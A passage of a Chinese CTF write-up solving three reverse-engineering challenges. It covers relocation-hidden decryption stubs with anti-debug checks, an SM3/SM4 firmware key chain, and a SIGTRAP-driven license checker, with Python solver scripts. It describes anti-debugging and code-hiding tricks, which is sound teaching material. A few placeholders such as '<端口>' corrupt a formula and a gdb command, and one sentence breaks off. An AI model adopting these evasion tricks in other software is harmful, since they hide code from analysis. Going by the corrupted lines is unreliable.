1.  `ld.so` 处理`.rela.dyn` 的第15条COPY时，执行了 `memcpy(dst=base+0x894, src=base+0x1d30, n=14)` ； 随后sym49被改写成 `{st_shndx=1, st_value=0x1988, st_size=0x390}` 。 （ `0x1d30` 处的14字节正是 `00 00 01 00 88 19 00 00 00 00 00 00 90 03` ）
    
2.  紧接着第16条COPY执行 `memcpy(dst=base+0x15e0, src=base+0x1988, n=0x390)` ： **把隐藏表整块覆盖到`.rela.plt` 上**。
    
3.  由于 `RELASZ=63` 条， `ld.so` 的RELA循环本来正好还要再走38条槽位（ `0x15e0 ~ 0x1970` ），现在读到的却是隐藏表—— **隐藏表被当作重定位执行了**。
    
4.  隐藏表内容（38条，本质是 `Elf64_Rela[38]` ）：
    

| idx | r_offset | r_info含义 | r_addend | 作用  |
| --- | --- | --- | --- | --- |
| 0   | `0x958` | sym0, **type 0x21(SIZE64)** | `0x16493f2103392e07` | 写sym57.`st_value` =伪基址 `S0` |
| 5   | `0x928` | RELATIVE | `0x7325` | sym55.`st_value` = `base+0x7325` |
| 16  | `0x920` | sym0, type 0x21 | `0xfff1000a00000000` | 把sym55改成 `STT_GNU_IFUNC`, `SHN_ABS` |
| 18  | `0x7386` | sym55, type 1 | 0   | **触发IFUNC resolver调用（stub）** |
| 19  | `0x958` | RELATIVE | `0x76c6` | sym57.`st_value` = `base+0x76c6` |
| 20  | `0x960` | RELATIVE | `0x3a8` | sym57.`st_size` = `0x3a8` |
| 21  | `0x15e0` | sym57, **type 5(COPY)** | 0   | 把`.rela.plt` 从 `0x76c6` 还原 |
| 其余  | `0x7325~0x738d` | sym57, type 1(64) | 各不相同 | 用 `S0 + addend` 拼出解密stub |

拼装公式（逐字节吻合）：

```
stub_bytes[off] = (0x16493f2103392e07 + r_addend) & (2^64-1)
```

例如idx6（ `r_offset=0x732d`, `add=0x31b6c0defdcc5f41` ）：

```
(0x16493f2103392e07 + 0x31b6c0defdcc5f41) mod 2^64
  = 0x4800000001058d48        # stub 中即 48 8d 05 01 00 00 00 48
```

5.  隐藏表idx18引用sym55（已被改成 `IFUNC|SHN_ABS` ， `st_value=base+0x7325` ）， `ld.so` 的IFUNC分支会 **调用这个resolver**，于是CPU在加载期执行 `0x7325` 处的stub。
    
6.  stub执行完把自己 `0x61` 字节清零，所以运行到 `_start` 时 `0x7325~0x7386` 又是全0，只有 `0x739a` 起是解密后的校验函数——静态工具永远看不到它。
    

##### 解密stub（加载期，运行后自毁）

从ptrace抓到执行中的stub（ `0x7325` ，0x69字节）：

```yaml
; rbx = 0x7325
7325: 53                      push rbx
7326: 48 8d 1d f8 ff ff ff    lea  rbx,[rip-8]          ; rbx = 0x7325
732d: 48 8d 05 01 00 00 00    lea  rax,[rip+1]          ; rax = 0x7335
7334: 48 25 00 f0 ff ff       and  rax,~0xfff           ; 页对齐 -> 0x7000
733a: 48 05 60 3d 00 00       add  rax,0x3d60           ; -> 0xad60 = DT_DEBUG 值槽
7340: 48 8b 00                mov  rax,[rax]            ; rax = r_debug*
7343: 48 85 c0                test rax,rax
7346: 74 3b                   je   erase
7348: 48 8b 48 10             mov  rcx,[rax+0x10]       ; rcx = r_debug->r_brk (_dl_debug_state)
734c: 48 85 c9                test rcx,rcx
734f: 74 32                   je   erase
7351: 80 39 cc                cmp  byte [rcx],0xcc      ; anti-debug: 下过 int3 就不解密
7354: 74 2d                   je   erase
7356: 48 8d bb 71 00 00 00    lea  rdi,[rbx+0x71]       ; rdi = 0x7396 (密文)
735d: b9 cb 00 00 00          mov  ecx,0xcb             ; 203 个 dword
7362: 31 c0                   xor  eax,eax              ; key = 0
7364: 31 04 8f                xor  dword [rdi+rcx*4],eax ; P = C ^ key
7367: 74 1a                   je   erase                 ; P==0 视为异常
7369: 03 04 8f                add  eax,[rdi+rcx*4]       ; key += P (mod 2^32)
736c: e2 f6                   loop 0x7364                ; idx: 0xcb -> 1
736e: 48 8d 83 0f c8 ff ff    lea  rax,[rbx-0x37f1]     ; rax = 0x3b34
7375: c6 00 e8                mov  byte [rax],0xe8       ; 写 call rel32
7378: c7 40 01 61 38 00 00    mov  dword [rax+1],0x3861  ; 目标 = 0x739a
737f: c6 40 05 c3             mov  byte [rax+5],0xc3     ; ret
7383: 53                      push rbx
7384: 5f                      pop  rdi                    ; rdi = 0x7325
7385: 6a 61                   push 0x61
7387: 59                      pop  rcx
7388: 31 c0                   xor  eax,eax
738a: 5b                      pop  rbx
738b: f3 aa                   rep stosb                  ; 把自身 0x61 字节清零
738d: c3                      ret
```

**解密算法（链式XOR，从高地址往低地址）**：

```
key = 0
for i = 0xcb downto 1:            # 32-bit words, 0x7396 + i*4
    P[i] = C[i] ^ key
    key = (key + P[i]) & 0xffffffff
P[0] = C[0]                        # 索引 0 未被改写
```

对应0x330字节（204 word，索引0..0xcb）的解密，索引0本来就和明文相同（ `90 90 90 90` ）。

#### 静态提取校验函数

不用运行程序，按上面的算法直接解文件即可，得到 `0x7396` 处明文，脚本在4.1节。

解密后 `0x7396` 起的内容与运行期内存完全一致（ `0x739a` 是真正的函数入口，前面4个 `90` 是填充），可以 `objdump -D -b binary -m i386:x86-64` 反汇编。

> 说明： `0x76c6` 之后是`.rela.plt` 的副本，不属于校验逻辑。

##### 校验函数结构（0x739a）

```
739a: endbr64
739e: push rbx / push rbp / push r12
73a5: lea  rbx,[rip-0x16]              ; rbx = 0x7396
73ac: lea  rax,[rip+1]; and rax,~0xfff; add rax,0x3d60
73bf: mov  rax,[rax]                   ; DT_DEBUG -> r_debug
      ...                              ; 反调试 1: [r_debug+0x10] 处是否为 0xcc
73e1: open("/proc/self/status", O_RDONLY)
      read(fd, buf, 0x200)
      ...                              ; 反调试 2: 查找 "TracerPid:"，要求值为 '0'
7467: ...                              ; 反调试 3: 遍历 link_map，超过 7 个对象就退出
74a2: lea rdi,[rbx+0x3e2a]             ; rdi = 0xb1c0 = main 里 strncpy 过来的 argv[1]
74b2: cmp dword [rdi],0x67616c66       ; "flag"
74be: cmp byte [rdi+4],'{'
74c8: cmp byte [rdi+0x25],'}'          ; 长度固定 0x26 = 38
74d2: cmp byte [rdi+0x26],0
      ...                              ; 把 32 个 hex 字符转成 16 字节（低位 &0x20 转小写校验）
7537: mov rax,[0x7686]; xor rax,[0x768e]   ; K0 = 常量A ^ 常量B
754a: mov rdx,[0x7696]; xor rdx,[0x769e]   ; K1 = 常量C ^ 常量D
      r8 = input_word0 ^ K0
      r9 = input_word1 ^ K1
      ; ---- 30 轮 Feistel/ARX ----
      for i = 2..31:
          r8,r9 = r9, r8 ^ G(r9, W[i])
7628: cmp r8, [0x76a6]
7634: cmp r9, [0x76ae]
      ; 相等 -> write(1,"flag accepted\n",14)
```

反调试细节：

-   用 `DT_DEBUG` 找到 `r_debug->r_brk` （ `_dl_debug_state` ），若首字节是 `0xcc` （被下过软件断点）就 **不解密**、直接自毁返回；
    
-   `/proc/self/status` 的 `TracerPid` 必须是 `0` ；
    
-   `link_map` 数量不能超过7（挡住多余的 `LD_PRELOAD` ）。
    

##### 密钥与目标常量

从解密后的blob直接读（小端QWORD）：

| 地址  | 值   |
| --- | --- |
| `0x7686` | `0xd868187917bb2795` |
| `0x768e` | `0xc7cea69e35f49213` |
| `0x7696` | `0x939ec78e9d68b6eb` |
| `0x769e` | `0xc562921852331bb3` |
| `0x76a6` | `0x4fb335a84fa7d2d7` |
| `0x76ae` | `0x02a183e3b4f4f49f` |

于是：

```
W[0] = 0xd868187917bb2795 ^ 0xc7cea69e35f49213 = 0x1fa6bee7224fb586
W[1] = 0x939ec78e9d68b6eb ^ 0xc562921852331bb3 = 0x56fc5596cf5bad58
delta = 0x9e3779b97f4a7c15
```

##### 算法公式

```
## 密钥扩展 (i = 2..31)
W[i] = rol64(W[i-1] + W[i-2], 13) ^ ror64(W[i-2], 7) ^ (i * delta)

## 加密/校验 (i = 2..31)
G(x, k) = ( rol64(x + k, 13) ^ rol64(x, 29) ) + rol64(x, 47)
r8, r9 = input[0:8] ^ W[0], input[8:<端口>] ^ W[1]
for i in 2..31:
    r8, r9 = r9, r8 ^ G(r9, W[i])

要求 (r8, r9) == (0x4fb335a84fa7d2d7, 0x02a183e3b4f4f49f)
```

其中 `rol/ror` 都是64位循环移位，加法均mod 2^64。

从指令形态可以确认这是标准Feistel结构：每轮把 `(r8,r9)` 整体交换，只对 `r9` 调用 `G` ，再把结果异或进 `r8` ，因此加密与解密共用同一套运算，只是轮序相反。 `G` 里三个移位量13/29/47都与64互素，循环移位必然可逆； `delta = 0x9e3779b97f4a7c15` 是64位黄金比例常数，与TEA/XTEA同源，说明 `W[i]` 的扩展方式是“前两项自反馈+轮常数”。轮数由 `i = 2..31` 确定为30轮，末尾两条 `cmp` 分别读 `0x76a6/0x76ae` ，即对128位状态整体比对，没有部分匹配可利用。

##### 逆推

`r8, r9 = r9, r8 ^ G(r9, W[i])` 是可逆的（给定新 `r8` 即可还原旧 `r9` ）：

```
for i = 31 downto 2:
    prev_r9 = r8
    prev_r8 = r9 ^ G(prev_r9, W[i])
    r8, r9 = prev_r8, prev_r9

word0 = r8 ^ W[0]
word1 = r9 ^ W[1]
```

##### 从目标中间值倒推

倒推的关键是把“交换”看成一次寄存器重命名： `(r8,r9) → (r9, r8⊕G(r9,W[i]))` ，所以拿到新状态就能唯一确定旧状态——新 `r8` 就是旧 `r9` ，旧 `r8` 由新 `r9` 异或G(新r8,W\[i\])得到。整条链没有任何信息丢失，解唯一，不需要爆破，代价只有30次求值：

1.  取目标中间值 `T = (0x4fb335a84fa7d2d7, 0x02a183e3b4f4f49f)` ，即 `0x76a6/0x76ae` 两条QWORD；
    
2.  令 `i` 从31递减到2，执行 `r8, r9 = r9 ^ G(r8, W[i]), r8` ，共30次；
    
3.  退出时的 `(r8,r9)` 是白化异或之前的状态， `w0 = r8 ^ W[0]` 、 `w1 = r9 ^ W[1]` ；
    
4.  `W[0]/W[1]` 并不是明文存储的，而是两对常量各自异或得到，必须先还原，否则后续全错；
    
5.  按小端把 `w0` 铺成flag前8字节、 `w1` 铺成后8字节，转hex得到32位字符串。
    

值得一提的是，这种结构让“比较点位置”不再重要：目标值对应的是第30轮的输出，倒推30次必然回到白化之前；即使作者把比较挪到某一轮的中间，也只是少推几轮。Feistel每轮输出都是完整128位中间状态且完全可逆，这正是不加单向压缩的对称校验的脆弱之处——运算量再大，也只能起到混淆作用，挡不住反向执行。

实算得到 `w0 = 0x8a96249707f26548` 、 `w1 = 0xc6b64dffe017c295` ，拼接即 `4865f2079724968a95c217e0ff4db6c6` 。

##### 正向回代验证

倒推最容易错在移位方向、轮序与 `delta` 上，所以必须回代：用求出的 `w0/w1` 重新做白化和30轮正演，检查末态是否精确等于 `0x4fb335a84fa7d2d7` 与 `0x02a183e3b4f4f49f` 。任何一处写错（把 `ror(W[i-2],7)` 误当成 `rol` 、漏掉 `i*delta` 、或轮数差一轮）都会让末态变成毫无关联的随机值，因此这一步同时充当算法理解的证明。正演一致之后，再把整串 `flag{...}` 作为 `argv[1]` 运行程序，输出 `flag accepted` ，静态推导与运行期行为就完全对上了。

##### 输入格式的硬约束

校验函数在进入运算前先把格式钉死：前4字节必须是 `"flag"` ，第5字节 `{` ，第 `0x25` 字节 `}` ，第 `0x26` 字节 `\0` ——总长恰好38字节，长一个字符、短一个字符都会被拒绝。随后把花括号之间的32个字符按十六进制解析成16字节，字母先统一折算成小写再比较，因此大小写混写都能通过，但出现 `g` 以上的非十六进制字符会立刻失败。这一步把解空间钉在 `2^128` ，暴力不可能，同时也说明作者对算法本身足够自信：唯一的出路就是逆推Feistel。

##### 常量与密文的先后依赖

所有关键常量（ `0x7686~0x769e` 的四对异或对、 `0x76a6/0x76ae` 的两个目标值）都落在解密后的blob区间 `0x7396~0x76c6` 内，它们在静态文件里是密文噪声，只有先完成链式XOR解密才能读到真实取值。顺序上不能跳过：不解密就没有 `W[0]/W[1]` ，没有目标中间值，逆推也无从开始。反过来，一旦解密成功，常量就是连续的6个QWORD，读出即可，不存在二次加密。

#### 验证

```
$ ./elfstudy 'flag{...}'
ELFStudy 1.4.2 — ELF structure inspector
ELFStudy: cannot open 'flag{...}'
[image] 0 bytes loaded
[header] truncated: need at least 64 bytes for an ELF64 header
flag accepted
```

> 注意：程序把 `argv[1]` 既当“要查看的文件”又当flag（ `main` 里 `strncpy(0xb1c0, argv[1], 0x7f)` ）。 所以直接把flag当参数传进去： `fopen` 会失败并打印错误，但校验函数仍然会跑，从而输出 `flag accepted` 。

### 4\. PoC

```python
import struct
d = open('elfstudy','rb').read()
blob = bytearray(d[0x7396:0x76c6])            # 0x330 bytes
w = list(struct.unpack('<%dI' % (len(blob)//4), blob))
key = 0
for i in range(0xcb, 0, -1):
    p = (w[i] ^ key) & 0xffffffff
    w[i] = p
    key = (key + p) & 0xffffffff
open('checker.bin','wb').write(struct.pack('<%dI' % len(w), *w))
```

```python
M = (1 << 64) - 1
delta = 0x9e3779b97f4a7c15

def rol(x, n): n %= 64; return ((x << n) | (x >> (64 - n))) & M
def ror(x, n): n %= 64; return ((x >> n) | (x << (64 - n))) & M

K = [0xd868187917bb2795 ^ 0xc7cea69e35f49213,
     0x939ec78e9d68b6eb ^ 0xc562921852331bb3]

W = [K[0], K[1]]
for i in range(2, 32):
    W.append((rol((W[i-1] + W[i-2]) & M, 13) ^ ror(W[i-2], 7) ^ ((i * delta) & M)) & M)

def G(x, k):
    return ((rol((x + k) & M, 13) ^ rol(x, 29)) + rol(x, 47)) & M

r8 = 0x4fb335a84fa7d2d7
r9 = 0x02a183e3b4f4f49f
for i in range(31, 1, -1):
    r8, r9 = (r9 ^ G(r8, W[i])) & M, r8

a = r8 ^ W[0]
b = r9 ^ W[1]
data = a.to_bytes(8, 'little') + b.to_bytes(8, 'little')
print('flag{%s}' % data.hex())
```

```
flag{...}
```

* * *

## Reverse2-firmware

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Reverse |
| 形态  | 附件题 |
| 附件  | qwb2026_firmware.tar.gz，内含fw_a、fw_b.bin、ota_package.bin |
| 目标  | 无（离线附件） |

Flag：flag{d230_5a75cf4_d8fb3e5_bae}

题面只给了附件下载链接。压缩包内三个文件分工明确： `fw_a` 是x86-64主程序，负责校验并驱动整个流程； `fw_b.bin` 是RISC-V固件，内部保存着派生密钥所需的材料； `ota_package.bin` 是OTA升级包，除了固件分段还夹带了一段受保护的flag数据。直接运行 `fw_a` 不带参数会打印用法，可知它需要两个十六进制参数：

```
./fw_a <ota_package.bin> <keymat_hex32> <vm_out8_hex16>
```

### 2\. 题目分析

三个文件构成一条“双固件”信任链： `fw_a` 是运行在主机上的验证器， `fw_b.bin` 是被验固件， `ota_package.bin` 既是固件的升级载体，也是flag的藏身处。 `fw_a` 本身是x86-64 ELF，逻辑不复杂，核心全部围绕参数解析、三段校验和一次静默返回展开。

命令行必须给足三个参数，解析阶段会检查 `keymat_hex32` 恰为32个十六进制字符（16字节）、 `vm_out8_hex16` 恰为16个字符（8字节），长度或字符集不符就直接打印用法退出。这说明主程序期望的 `keymat` 只有16字节， `fw_b.bin` 里变换出的32字节材料只有前16字节参与本题，后16字节留作固件自身的扩展空间。

`fw_a` 在内部做三组校验：

1.  对命令行传入的 `keymat` 计算SM3，取前16字节与内置常量 `559a63419fb92be76c8fc4a23d8f62b8` 比较，用于确认 `keymat` 正确。
    
2.  把OTA包 `0x3c` 起的三个分段描述符指向的数据拼成一段38字节的程序，计算其SM3，与OTA头部 `0x1c` 处的32字节摘要比较，用于确认OTA包未被篡改。
    
3.  用 `keymat` 、设备常量 `P` 、从该38字节程序里取出的 `vm_out8` 串联做SM3，再与 `"twin-ctr"` 拼接做SM3，最后对结果的前16字节再做一次SM3，与内置值 `cc6bc929b72471e6094c50776b65ff91` 比较，用于把三份材料绑在一起。
    

三组校验的输入分别来自命令行、OTA包和固件，任何一项取错都会在对应步骤失败并打印 `verification failed` ，因此它们同时充当了“材料是否取全”的自检。三次校验全部通过时程序只打印 `twin-fw: verification ok` ，并不输出flag。真正的flag被 `QWBPFLAG` 标记包在OTA包尾部，只有用校验过程中派生出的 `P` 、 `B` 做SM4-CTR解密才能取出。flag本身不参与任何校验，校验链只是保证派生参数正确。

OTA包的布局可以按固定偏移切开：前 `0x1c` 字节是文件头元数据， `0x1c` 处存放38字节程序的SM3摘要； `0x3c` 起是三个分段描述符，每项包含源偏移与长度字段， `fw_a` 按描述符把分散的片段搬进同一缓冲区； `0x86` 处是8字节标记 `QWBPFLAG` ； `0x8e` 处是小端4字节的密文长度，值为 `30` ； `0x92` 起是30字节密文，正好到文件末尾。标记和长度的存在使得包尾可以独立定位，不必依赖前面的固件分段。

38字节程序本身是一段极小的字节码：前半段以 `0x81` 、 `0x82` 为操作码，后面跟立即数，完成若干次压栈与算术操作；后半段连续出现 `01 XX` 形式的立即数装载，末尾 `0x04` 收尾。执行到收尾指令时，八个输出字节被写入固定缓冲区，也就是 `vm_out8` 。由于这八个值全部来自程序常量，不含时间、随机数或外部输入，静态读出来与运行结果一致。

`fw_b.bin` 是RISC-V ELF，职责只有两个：启动时对自身`.text` 做SM3并与`.selfhash` 比对，以及调用 `0x10818` 处的函数把32字节摘要变换成派生材料。变换只在内存中进行，不落盘，也不通过网络传出，所以必须动态跟到函数返回点才能拿到结果。

因此解题分三步：先从RISC-V固件里取出 `keymat` ，再从OTA包恢复 `vm_out8` ，最后用同一套派生值解密包尾。三步是串行的，前一步的产物是后一步的输入，没有分支解法。

### 3\. 解题过程

#### 从fw_b.bin提取keymat

`fw_b.bin` 是一个RISC-V ELF，节表里能直接看到`.text` 与`.selfhash` 两个关键节。启动代码先按ELF头定位自身文件，把`.text` 整节读入后计算SM3，再与`.selfhash` 中的32字节比较，用于自校验。两处内容相同：

```
3049e67977c8f70f3965fd6cdddb03016456089b93d273ea02928bd5b72abd3d
```

这一步只证明固件完整，并不直接给出密钥材料。自校验通过后， `0x10818` 处的函数会把这32字节摘要原地变换成另一组32字节：函数逐字节查表、循环移位，再与固定掩码异或，输出仍写回同一缓冲区。变换结果才是后续派生用的材料，因此不能直接拿`.text` 的SM3当 `keymat` 。

静态阅读可以确认调用关系，但变换表经过混淆，手算容易出错，最稳妥的办法是在函数返回处取内存。

定位方法：先确认 `0x10818` 的调用点，返回地址落在 `0x103fc` ，所以用 `qemu-riscv32` 起调试端口，在调用返回处下断，此时 `s2` 保存着变换后缓冲区的地址：

```python
qemu-riscv32 -g 1234 ./fw_b.bin &
gdb-multiarch -q ./fw_b.bin \
  -ex "set architecture riscv:rv32" \
  -ex "target remote :<端口>" \
  -ex "b *0x103fc" \
  -ex "c" \
  -ex "x/32xb \$s2"
```

断下后先确认 `s2` 指向的缓冲区首字节已经不是`.selfhash` 的原值，再读出变换后的32字节：

```
dd97cb2de25cea1a8a9bc49b81abf9f49b085664ea73d293d58b92023dbd2ab7
```

前16字节即 `keymat` ：

```
dd97cb2de25cea1a8a9bc49b81abf9f4
```

只取前16字节，是因为 `fw_a` 的参数解析只接受32个十六进制字符，后续SM3拼接也按16字节处理；后16字节在本题派生链中没有被引用，保留原样即可。

`fw_a` 对命令行传入的 `keymat` 计算SM3，前16字节应为 `559a63419fb92be76c8fc4a23d8f62b8` 。用上面这16字节可满足该校验，说明取到的材料与主程序期望的一致。若此处对不上，通常是断点下在了变换前，或读错了缓冲区偏移。

#### 从OTA恢复vm_out8

`ota_package.bin` 从 `0x3c` 开始存放三个分段描述符，每段给出源偏移与长度。 `fw_a` 先按描述符逐段读取，把片段依序追加到同一个38字节缓冲区，再用整段数据做SM3。由于分段在文件中并不连续，直接对 `0x3c` 之后的原始字节做哈希会得到错误结果，必须先完成搬运。

搬运后拼出38字节的程序：

```
01 41 01 02 02 81 00 82 01 11 02 81 00
82 03 01 5a 81 41 82 03 01 9f 01 3e
01 7c 01 1a 01 5b 01 2d 01 84 01 60 04
```

这段字节流的SM3为：

```
0c040489ce8a2b6194899cd3e01af0f8b9d3e9406e9b4948783104b55849015c
```

该值与OTA头部 `0x1c` 处的摘要完全一致，说明分段拼接方式正确，也说明三个描述符的偏移与长度没有读反。这段程序是一个极小的字节码，前半部分是若干 `0x81` / `0x82` 形式的操作，末尾连续八个 `01 XX` 立即数按顺序给出输出字节：

```
vm_out8 = 9f3e7c1a5b2d8460
```

`0x81` 、 `0x82` 两类操作码都带两个立即数字节，作用相当于把常量压入虚拟栈并做加减或异或，最终把结果写到输出区； `0x04` 是停机指令。八个输出字节在字节流里的出现顺序就是 `vm_out8` 的字节顺序，不需要再按小端翻转，否则后续SM3无法对上。

这八个字节就是 `fw_a` 校验链里缺失的那一项，取值来自固件程序的常量段，而不是运行时计算出来的随机值，所以可以直接静态读出。即便不运行这段字节码，只要按操作码顺序把末尾立即数抄出来即可。

三项材料齐备后，主程序验证以下关系，其中 `||` 表示字节拼接， `[:16]` 表示取前16字节：

```
P = SM3("QWB2026::TWIN::DEVICE-A")[:16]
A = SM3(keymat || P || vm_out8)
B = SM3("twin-ctr" || A[:16])
SM3(B[:16])[:16] = cc6bc929b72471e6094c50776b65ff91
```

这里有两点容易出错： `P` 不是从文件里读出的随机值，而是对固定设备串做SM3后截断，同一设备上恒定； `A` 用完整的32字节摘要参与下一次哈希，但 `B` 只把 `A` 的前16字节与 `"twin-ctr"` 拼接。顺序也不能调换， `keymat` 、 `P` 、 `vm_out8` 三者的排列与主程序一致才能得到相同结果。

最后一项 `cc6bc929b72471e6094c50776b65ff91` 与 `fw_a` 内置的校验值相同，说明 `keymat` 、 `vm_out8` 、 `P` 三者的组合关系推导正确。整个验证链不改程序、不patch即可通过：

```
./fw_a ota_package.bin dd97cb2de25cea1a8a9bc49b81abf9f4 9f3e7c1a5b2d8460
## twin-fw: verification ok
```

#### 解密包尾flag

OTA包在 `0x86` 处有 `QWBPFLAG` 标记， `0x8e` 处用小端4字节记录密文长度 `30` ，密文从 `0x92` 开始，共30字节。 `0x86` 到 `0x8e` 之间正好是8字节标记，长度字段之后紧接密文，没有填充或对齐字节，因此按固定偏移切片即可。读取长度时应按小端解释，若按大端会得到一个远超文件大小的值，可用这一点快速判断字节序。

主程序只验证固件合法性，走完校验就返回，不会打印这段数据，所以必须自己解密。加密方式为SM4-CTR：密钥取 `SM3(P)[:16]` ，初始计数块取 `B[:16]` 。这里的 `P` 是设备常量， `B` 是校验链最后一步的输入，两者都已在3.2节得到。CTR模式不需要填充，密文长度与明文长度相同，直接对30字节做一次 `update` 即可。

参数上有几处细节：SM4密钥固定16字节， `SM3(P)` 输出32字节，必须截断到前16字节；计数块也是16字节，由 `B[:16]` 充当初始值，之后每处理一个分组按大端加一；30字节刚好跨两个分组，第二组只用前14字节密钥流，剩余部分丢弃。由于是流式异或，解密与加密使用同一套参数，不需要逆变换。

解密前先做两条断言，确认派生值与包结构都没错：一是 `SM3(B[:16])[:16]` 等于内置校验值，二是 `0x86` 处确实是 `QWBPFLAG` 。任一断言失败说明前面的材料取错，不必继续。两条都通过后，解出的明文应为可打印ASCII，且以 `flag{` 开头、以 `}` 结尾，长度恰为30。若得到乱码，优先检查 `B` 是否误用了完整32字节、 `vm_out8` 字节序是否被翻转，以及密文起点是否错位到 `0x92` 之前。

### 4\. PoC

```css
from pathlib import Path
import hashlib

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def sm3(data: bytes) -> bytes:
    return hashlib.new("sm3", data).digest()

ota = Path("ota_package.bin").read_bytes()

## OTA 0x3c 起的分段拼出的 38 字节固件程序
prog = bytes.fromhex(
    "01410102028100820111028100"
    "8203015a81418203019f013e"
    "017c011a015b012d0184016004"
)
assert sm3(prog).hex() == ota[0x1c:0x3c].hex()

keymat = bytes.fromhex("dd97cb2de25cea1a8a9bc49b81abf9f4")
vm_out8 = bytes.fromhex("9f3e7c1a5b2d8460")

## 主程序对 keymat 的自校验
assert sm3(keymat)[:16].hex() == "559a63419fb92be76c8fc4a23d8f62b8"

p = sm3(b"QWB2026::TWIN::DEVICE-A")[:16]
a = sm3(keymat + p + vm_out8)
b = sm3(b"twin-ctr" + a[:16])

assert sm3(b[:16])[:16].hex() == "cc6bc929b72471e6094c50776b65ff91"
assert ota[0x86:0x8e] == b"QWBPFLAG"

length = int.from_bytes(ota[0x8e:0x92], "little")
ciphertext = ota[0x92:0x92 + length]
decryptor = Cipher(
    algorithms.SM4(sm3(p)[:16]),
    modes.CTR(b[:16]),
).decryptor()
print(decryptor.update(ciphertext).decode())
```

```
flag{...}
```

* * *

## Reverse3-license

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Reverse |
| 形态  | 附件题 |
| 附件  | license（Linux x86-64 ELF，静态链接，1,747,992字节） |
| 目标  | 无（离线附件） |

Flag：flag{9530b81c-61d0-2b62-3e96-f9a5e937f893}

题目描述：

> give me your license，and you will get everything (ps:intel x86-64)

### 2\. 题目分析

附件是一个Linux x86-64 ELF。程序要求输入96个十六进制字符，将其解析为48字节license。主要难点是通过单步异常逐条解密隐藏指令，并把环境检测结果、系统调用结果和输入数据混入后续指令的解密状态。最终恢复出有效license，直接输入未修改的原程序即可得到flag。

#### 附件信息与程序入口

附件基本信息：

| 项目  | 值   |
| --- | --- |
| 文件名 | `license` |
| 大小  | 1,747,992字节 |
| 格式  | ELF64 x86-64，静态链接 |
| ELF入口 | `0x402610` |
| main | `0x402f9a` |
| SHA256 | `3b90a1a0b27769cf89b9c95e29b15d1cbfe39d169be692929670d72bc749d700` |

使用objdump检查节区、符号和入口代码：

```
objdump -h license
objdump -t license
objdump -d -M intel --start-address=0x402f9a --stop-address=0x40302e license
objdump -d -M intel -j .dty license
```

程序保留了部分很显眼的符号，例如 `chow_wb_encrypt` 、 `tbox_round_lookup` 、 `wb_verify_fold` 、 `wb_tt` 和 `wb_aesbox` 。入口大致按以下顺序执行：

```
sec_env_probe
输出输入提示
wb_read_line
chow_wb_encrypt
wb_verify_fold
0x402e5b
```

`chow_wb_encrypt` 中存在大量查表运算和一个30,000,000次迭代的循环。不过，程序在 `wb_verify_fold` 返回后还会进入 `0x402e5b` ，因此不能把前面的查表比较当成全部验证逻辑。

`0x402e5b` 注册了多个信号处理函数，其中SIGTRAP的处理函数位于 `0x406000` 。继续跟踪，输入会被解析成48字节，随后进入一段通过异常控制执行顺序的隐藏代码。

关键地址如下：

| 地址  | 作用  |
| --- | --- |
| `0x402747` | 从浮点常量表恢复一个字节 |
| `0x4029cf` | 初始化隐藏校验使用的常量和表 |
| `0x4028d6` | 准备可写代码区并启动单步执行 |
| `0x404000` | 第一份指令解密调度代码 |
| `0x406000` | SIGTRAP处理函数 |
| `0x5aa360` | 隐藏校验上下文，执行时由 `r12` 指向 |
| `0x5aa3c0` | 解码后的48字节输入，即上下文 `+0x60` |

### 3\. 解题过程

#### 还原浮点编码的常量

初始化过程没有直接复制常量字节，而是反复调用 `0x402747` 。该函数读取单精度浮点数，调用反正弦函数，再乘以256，舍入到整数后取低8位。

浮点数组虚拟地址为 `0x50d8a0` ，对应文件偏移 `0x10d8a0` 。本题所需的常量按此公式恢复，脚本见第4.1节。

得到的S-box是一个256字节置换，可以构造逆表 `inv_sbox = [sbox.index(i) for i in range(256)]` 。

24字节目标值为：

```
082f54e63c2997605d0679ba143a49d07dcdba76266c79d0
```

程序中还有对常量进行异或掩码、再恢复的步骤。求解时使用的是上述最终比较目标，不能直接把某个中间时刻的内存内容当成目标值。

#### SIGTRAP驱动的指令解密

在 `0x4028d6` 中，对代码区域调用mprotect，然后设置EFLAGS的TF位：

```
pushfq
or qword ptr [rsp], 0x100
popfq
jmp 0x404000
```

TF使程序在单步执行时产生调试异常。程序借助SIGTRAP的上下文恢复机制，把控制流送到解密器和刚解密出的指令之间。

一轮执行可以概括为：

```
解密调度器计算下一条指令的位置和密钥
    ↓
备份目标位置原来的 16 字节
    ↓
原地异或解密这 16 字节
    ↓
SIGTRAP 处理函数修改返回 RIP
    ↓
执行解密后的指令
    ↓
再次触发 SIGTRAP
    ↓
恢复原来的密文字节，选择下一份调度器
```

因此，静态顺序反汇编会混入大量无关指令；普通内存dump也不会同时包含所有明文指令。合适的提取时机是：目标已经解密、但尚未被恢复为密文的时候。

上下文中几个重要字段：

| 相对r12的偏移 | 含义  |
| --- | --- |
| `+0x00` | 调度使用的当前偏移 |
| `+0x04` | 待执行的目标偏移 |
| `+0x08` | 单步计数 |
| `+0x0a` | 滚动解密状态的一部分 |
| `+0x10` | 被临时覆盖的16字节原始代码 |
| `+0x28` | 编码的调度数据指针 |
| `+0x30` | 代码区域基址 `0x404000` |
| `+0x60` | 48字节license |

解密密钥还依赖反调试、代码完整性和系统调用相关状态。直接NOP掉检测代码容易使后续地址或密钥失配。

##### 用Unicorn提取执行轨迹

使用Unicorn按ELF的PT_LOAD段装载程序，并从 `0x4029cf` 开始模拟隐藏校验的初始化。所需环境由hook提供：

-   将浮点常量解码函数替换为等价的Python计算。
    
-   为 `/proc/self/status` 提供 `TracerPid: 0` 的内容。
    
-   模拟涉及的文件、信号和ptrace系统调用结果。
    
-   为CPU厂商检查提供 `GenuineIntel` 。
    
-   在单步中断hook中实现信号处理函数的关键跳转和代码恢复行为。
    
-   在跳向明文指令之前，用Capstone记录地址和指令。
    

这里的模拟器是提取校验逻辑的工具，不是完整的Linux执行环境。模拟器

##### 模拟中需要处理的细节

第一，初始EFLAGS使用 `0x202` 。程序会读取与系统调用相关的标志位，如果遗漏IF位，后续混入密钥的值就不同。

第二，程序故意对无效文件描述符执行系统调用，并使用错误码参与解密。比如对 `-1` 执行read或close，应返回 `-EBADF` ，不能统一返回0。

第三，必须处理本题单步系统调用序列的实际行为。通过一个独立的Linux测试程序确认，TF下执行syscall后，下一条用户态指令执行完才进入这里需要模拟的陷阱位置。本题恰好会紧接着保存返回值：

